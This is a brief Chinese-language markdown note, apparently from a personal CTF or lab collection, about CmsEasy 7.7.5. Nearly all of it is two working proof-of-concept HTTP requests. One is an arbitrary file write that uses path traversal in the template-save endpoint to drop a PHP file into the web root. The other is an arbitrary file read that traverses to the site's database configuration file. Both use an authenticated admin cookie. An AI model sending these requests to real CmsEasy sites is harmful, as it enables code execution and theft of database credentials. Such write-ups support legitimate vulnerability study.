## CmsEasy_7.7.5_20211012

**参考文章**

[CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 _ jdr](F:\LocalCTF\CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 _ jdr.html)

### 任意文件写入漏洞poc

```http
POST /index.php?case=template&act=save&admin_dir=admin&site=default HTTP/1.1
Host: 192.168.31.96
Content-Length: 57
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded;
Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4;
Connection: close

sid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<?php phpinfo();?>
```

### 任意文件读取漏洞poc

```http
POST /index.php?case=template&act=fetch&admin_dir=admin&site=default HTTP/1.1
Host: 192.168.31.96
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded;
Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4; 
Connection: close
Content-Length: 32

id=#data_d_.._d_.._d_.._d_config_d_config_database.php
```

